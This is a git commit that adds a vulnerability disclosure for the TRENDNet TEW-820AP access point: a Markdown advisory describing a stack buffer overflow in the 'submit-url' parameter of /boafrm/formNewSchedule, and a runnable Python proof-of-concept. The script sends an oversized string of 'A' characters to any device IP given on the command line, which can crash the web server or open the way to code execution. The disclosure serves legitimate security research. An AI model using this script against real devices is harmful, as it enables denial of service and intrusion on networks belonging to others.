1e07932f455ce798c53dcdd9a8984befb1b4ddd6
song.x <songxiaobao86@163.com>
2022-10-27 11:19:50 +0800

    Add TRENDNet vulnerability.

---
+++ TRENDNet/POC_for_formNewSchedule.py
@@ -0,0 +1,90 @@
+import argparse, requests
+import sys
+import re
+import json
+import time
+
+
+class TestCase:
+    def __init__(self, bug_url='', bug_http_body='', other_infos=[]):
+        self.bug_url = bug_url
+        self.bug_http_body = bug_http_body
+        self.other_infos = other_infos
+
+
+global cookie
+global headers
+global test_case
+global request_id
+
+if sys.version_info[0] != 3:
+    print("Please run the exploit in python3")
+    sys.exit(1)
+
+
+def load_test_case(test_case_no):
+    bug_file = './bug-all.txt'
+    with open(bug_file, 'r') as file:
+        line = file.readline()
+        while line:
+            if line[4:-1] == test_case_no:
+                print(line[:-1])
+                break
+            line = file.readline()
+
+        global test_case
+        test_case = TestCase
+        for i in range(0, 9):
+            line = file.readline()
+            if line[:6] == 'BugUrl':
+                test_case.bug_url = line[8:-1]
+            if line[:len('BugHttpBody')] == 'BugHttpBody':
+                test_case.bug_http_body = line[len('BugHttpBody') + 2:-1]
+            if line[:len('OtherInfos')] == 'OtherInfos':
+                test_case.other_infos = json.loads(line[len('OtherInfos') + 2:-1])
+                break
+        print(test_case.bug_url)
+        print(test_case.bug_http_body)
+        print(test_case.other_infos)
+
+def get_XSRF_TOKEN():
+    print("0. request", base_url)
+    response = requests.get(url=base_url, headers={})
+    global cookie
+    cookie = response.headers.get('Set-Cookie')
+
+
+def get_htm():
+    htm_url = "admin_schedules.htm"
+    url = base_url + "/" + htm_url
+    print("1. send request to", url)
+    try:
+        response = requests.get(url=url)
+        print(response)
+    except Exception as e:
+        print(str(e))
+
+
+def poc():
+    target_url = "boafrm/formNewSchedule"
+    print("2. get target_url:", target_url)
+    url = base_url + "/" + target_url
+    print("3. send request to", url)
+    data = "submit-url=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    print("request body:", data)
+    response = requests.post(url=url, headers={}, data=data, allow_redirects=False)
+    print(response)
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Run the exploit')
+    parser.add_argument('ip', type=str, default=None, help='The server ip')
+    args = parser.parse_args()
+
+    global base_url
+    base_url = "http://{}".format(args.ip)
+
+    get_XSRF_TOKEN()
+    get_htm()
+    poc()
+
---
+++ TRENDNet/TRENDNet AP buffer overflow vulnerabilities.md
@@ -0,0 +1,47 @@
+# TRENDNet AP buffer overflow vulnerabilities
+
+![image-20221027101724040](./image/image-20221027101724040.png)
+
+## Overview
+
+* Type: buffer overflow
+* Supplier: TRENDNet  (https://www.trendnet.com/)
+* Product: TRENDNet TEW-820AP (Version v1.0R)
+* Firmware download: https://downloads.trendnet.com/tew-820ap/firmware/tew-820apv1_(fw1.01b01).zip
+* affect version: TRENDNet TEW-820AP 1.01.B01
+
+
+
+## Description
+
+TrendNet Wireless AC Easy-Upgrader TEW-820AP (Version v1.0R) is vulnerable to buffer overflow in handling http packet in firmware version 1.01.B01 which may result in remote code execution or denial of service. These issues are in the binary boa which resides in /bin folder which is responsible for serving http connection received by the device.
+
+### 1. Vulnerability Details
+
+A stack overflow vulnerability exists in processing the post request “/boafrm/formNewSchedule”. The problem arises in processing “submit-url” parameter which could be arbitrarily long. The value of this parameter is copied onto stack memory without any bounds check by "sprintf" function (as shown at line 20 of Figure B) which could lead to a buffer overflow. The attackers can construct a payload to carry out arbitrary code attacks.
+
+
+
+ <img src="./image/image-20221027104231703.png" alt="image-20221027104231703" style="zoom:25%;" />
+
+Figure A: The decompiled code of function which read value of parameter "submit-url" and call send_redirect_perm function with the value as a parameter.
+
+<img src="./image/image-20221027104500584.png" alt="image-20221027104500584" style="zoom:25%;" />
+
+Figure B: The decompiled code of function send_redirect_perm.
+
+
+
+### 2. Reproduce and POC
+
+To reproduce the vulnerability, the following steps can be followed:
+
+Start frimware through QEMU system or other methods (real device)
+
+1. Use the default username and password to login web.
+2. Execute the poc script POC_for_formNewSchedule.py script as follows:
+
+```bash
+python3 POC_for_formNewSchedule.py 192.168.1.1
+```
+
